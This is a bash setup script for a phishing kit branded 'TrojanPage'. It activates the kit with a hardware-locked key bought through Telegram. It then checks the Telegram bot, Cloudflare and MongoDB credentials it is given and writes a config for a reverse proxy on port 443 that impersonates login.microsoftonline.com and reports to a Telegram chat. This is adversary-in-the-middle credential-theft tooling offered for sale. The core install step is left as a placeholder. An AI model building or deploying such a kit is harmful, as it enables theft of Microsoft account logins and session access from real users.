#!/bin/bash
# 🏛️ TROJANPAGE - PRO GATEKEEPER EDITION
# ------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER & HWID LOCK ---
clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
echo " ----------------------------------------------------------------------------------"

# GENERATE HWID
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026" # <--- Change this for your private key generator
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
echo -e "${BLUE}[!] Send this HWID to @YourUsername on Telegram for activation.${NC}"
echo " ----------------------------------------------------------------------------------"

# ACTIVATION LOCK
read -p "ENTER ACTIVATION KEY: " USER_KEY

if [ "$USER_KEY" != "$VALID_KEY" ]; then
    echo -e "${RED}[error] $(date +%H:%M:%S) received status 401 Unauthorized.${NC}"
    echo -e "${RED}[error] Hardware ID $HWID is not registered.${NC}"
    exit 1
fi

echo -e "${GREEN}[success] Activation Successful. Initializing Setup Wizard...${NC}"
sleep 2

# --- 2. VERIFIED SETUP WIZARD (Runs ONLY after Activation) ---
echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"

# TELEGRAM CHECK
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram..."
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} VALID${NC}"; break
    else
        echo -e "${RED} INVALID. Try again.${NC}"
    fi
done

read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE CHECK
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare..."
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN} VALID${NC}"; break
    else
        echo -e "${RED} INVALID. Try again.${NC}"
    fi
done

# MONGODB CHECK
sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
while true; do
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing MongoDB..."
    if mongosh --host localhost --username "$M_USER" --password "$M_PASS" --authenticationDatabase admin --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} CONNECTED${NC}"; break
    else
        echo -e "${RED} AUTH FAILED. Try again.${NC}"
    fi
done

read -p "Enter Domain (e.g., motarmo.click): " USER_DOMAIN

# --- 3. FINAL DEPLOYMENT ---
echo -e "${BLUE}[+] Deploying Core Engine...${NC}"
# Setup License file for the 'run.sh' script
CURRENT_DATE=$(date +%s)
EXPIRY=$(($CURRENT_DATE + 7776000)) # 90 Days
echo "$HWID:$EXPIRY" > /root/.license

# Create Config
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb://$M_USER:$M_PASS@localhost:27017"
}
EOF

# [Insert Core Installation, Adobe GUI, and run.sh creation here]

echo -e "${GREEN}[+] DEPLOYED SUCCESSFULY. Type 'start' to begin operations.${NC}"
